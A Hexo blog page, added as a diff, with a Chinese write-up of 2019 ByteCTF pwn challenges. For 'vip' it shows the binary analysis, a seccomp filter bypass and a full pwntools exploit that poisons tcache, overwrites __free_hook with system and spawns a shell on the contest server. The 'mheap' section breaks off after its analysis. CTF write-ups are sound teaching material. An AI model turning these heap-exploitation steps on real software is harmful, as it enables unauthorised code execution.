@@ -1,0 +1,1810 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="骑麦兜看落日">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="骑麦兜看落日">
+    
+    <meta name="keywords" content="Hexo,骑麦兜看落日">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>[WriteUp]2019ByteCTF · 骑麦兜看落日&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+        <!-- algolia -->
+        <script>
+            
+            var hits = JSON.parse('{"per_page":10}')
+            var labels = JSON.parse('{"input_placeholder":"Search for Posts","hits_empty":"We did not find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}')
+
+            var algolia = {
+                applicationID: '5D5KDIMZEQ',
+                apiKey: 'b4ec67c101aa9269e65e640e2e469343',
+                indexName: 'my_index',
+                hits: hits,
+                labels: labels
+            }
+        </script>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Hexo</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">[WriteUp]2019ByteCTF</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Hexo</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:30vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            [WriteUp]2019ByteCTF
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Pwn">Pwn</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "WriteUp">WriteUp</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "prctl">prctl</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "global_max_fast">global_max_fast</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "read">read</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "UAF">UAF</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.7k</span>阅读时长: <span class="post-count reading-time">14 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/09/10</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <hr>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><hr>
+<h2 id="vip"><a href="#vip" class="headerlink" title="vip"></a><strong>vip</strong></h2><hr>
+<h3 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h3><blockquote>
+<p>nc 112.126.103.14 9999</p>
+<p>题目附件： <a href="https://adworld.xctf.org.cn/media/uploads/task/2808448f52cd43e3871142106830da82.zip" target="_blank" rel="noopener">点击下载附件 1</a></p>
+</blockquote>
+<hr>
+<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ file vip </span><br><span class="line">vip: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5568ea4336c242cf49752f54e4de14aee2d21b35, <span class="keyword">for</span> GNU/Linux 3.2.0, stripped</span><br><span class="line">$ checksec vip </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>程序的意图很明显,在edit时</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">read_rnd</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_4040E0 )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, size);</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> read(fd, buf, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>为了使用户数据可控,要么使全局变量<code>dword_4040E0</code>为true,要么使fd=0</p>
+<p>前一个方案由于用户数据的不可控而不可能,后一个方案则可以通过后门函数vip实现</p>
+<p>程序中存在沙盒</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x06 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0010</span><br><span class="line"> 0004: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00050005  return ERRNO(5)</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+
+<p>不过我们可以通过vip函数控制前6行,在遇到<code>open</code>函数时报错返回0,大致如下(比赛的时候写的删了,下边的没有测)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A == openat ? next : allow</span><br><span class="line">A = args[1]</span><br><span class="line">A == 0xff</span><br><span class="line">A == 0x7e ? next : allow</span><br><span class="line">dead:</span><br><span class="line">return ERRNO(0)</span><br><span class="line">allow:</span><br><span class="line">return ALLOW</span><br></pre></td></tr></table></figure>
+
+<p>这里有几个需要注意的点</p>
+<blockquote>
+<ul>
+<li><code>open</code>函数最终调用的是<code>openat</code>系统调用…这里搞了很久,最后调试了一下才发现</li>
+<li>由于<code>system</code>函数在开新的bash时可能会调用到<code>open</code>函数,所以需要再判断一下参数防止<code>system</code>调用失败</li>
+<li>这个规则虽然有7行,但其实最后一行可以调用原先存在的规则,只需要改一下偏移位</li>
+</ul>
+</blockquote>
+<p>最终达到的效果就是调用open函数返回0,因此<code>read</code>函数可以正常读,之后就是常规的攻击手法</p>
+<hr>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">'debug'</span>, arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, aslr=<span class="literal">False</span>, terminal=[<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>])</span><br><span class="line"></span><br><span class="line">exe = <span class="string">'./vip'</span></span><br><span class="line">lib = <span class="string">'./libc-2.27.so'</span></span><br><span class="line">ip = <span class="string">'112.126.103.14'</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line">elf = ld(exe, lib)</span><br><span class="line">libc = ELF(lib) <span class="keyword">if</span> lib <span class="keyword">else</span> elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(script=<span class="string">''</span>)</span>:</span></span><br><span class="line">    attach(io, gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(opt, idx=None)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Your choice: '</span>, str(opt))</span><br><span class="line">    <span class="keyword">if</span> idx!=<span class="literal">None</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, content=<span class="string">''</span>)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>, idx)</span><br><span class="line">    io.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vip</span><span class="params">(name)</span>:</span></span><br><span class="line">    choice(<span class="number">6</span>)</span><br><span class="line">    io.sendafter(<span class="string">'name:'</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rule</span><span class="params">(code,jt ,jf ,k)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p16(code) + p8(jt) + p8(jf) + p32(k)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rule</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    payload += rule(<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>)</span><br><span class="line">    payload += rule(<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x07</span>,<span class="number">0x00000101</span>)</span><br><span class="line">    payload += rule(<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000018</span>)</span><br><span class="line">    payload += rule(<span class="number">0x54</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x000000ff</span>)</span><br><span class="line">    payload += rule(<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x0000007e</span>)</span><br><span class="line">    payload += rule(<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00050000</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line">LOCAL       = <span class="number">0</span></span><br><span class="line">stdout_addr = <span class="number">0x00000000004040A0</span></span><br><span class="line">libc_off    = <span class="number">0x3ec760</span></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"><span class="comment">#----------ban open----------</span></span><br><span class="line">    payload = build_rule()</span><br><span class="line">    vip(<span class="string">'A'</span>*<span class="number">0x20</span>+payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------leak libc---------</span></span><br><span class="line">    add(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">'A'</span>*<span class="number">0x58</span>+p64(<span class="number">0x61</span>)+p64(stdout_addr))</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    libc.address = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - libc_off</span><br><span class="line">    log.info(hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------getshell----------</span></span><br><span class="line">    dele(<span class="number">3</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    payload = <span class="string">'/bin/sh\x00'</span></span><br><span class="line">    payload += <span class="string">'A'</span>*(<span class="number">0x58</span>-len(payload))</span><br><span class="line">    payload += p64(<span class="number">0x61</span>)</span><br><span class="line">    payload += p64(libc.sym[<span class="string">'__free_hook'</span>])</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x68</span>, payload)</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x8</span>, p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> LOCAL:</span><br><span class="line">        io = elf.process(env=&#123;<span class="string">"LD_PRELOAD"</span>: libc.path&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h3><hr>
+<h2 id="mheap"><a href="#mheap" class="headerlink" title="mheap"></a><strong>mheap</strong></h2><hr>
+<h3 id="题目信息-1"><a href="#题目信息-1" class="headerlink" title="题目信息"></a>题目信息</h3><blockquote>
+<p>nc 112.126.98.5 9999</p>
+<p>题目附件： <a href="https://adworld.xctf.org.cn/media/uploads/task/2c5dfc52b4f044bba044d072bfb10a5c.zip" target="_blank" rel="noopener">点击下载附件 1</a></p>
+</blockquote>
+<hr>
+<h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ file mheap </span><br><span class="line">mheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9f039b0ee102a6fbffedebb93fb000464586d385, <span class="keyword">for</span> GNU/Linux 3.2.0, stripped</span><br><span class="line">$ checksec mheap </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>程序自己实现了一个单链表的<code>malloc</code>,这种数据结构只要存在洞就很容易攻击,不过这道题的难点也在于找洞</p>
+<p>漏洞点和2018LCTF很相似,都是对于<code>read</code>函数的返回值检查不严格造成的,我们看对read函数返回值的检查</p>
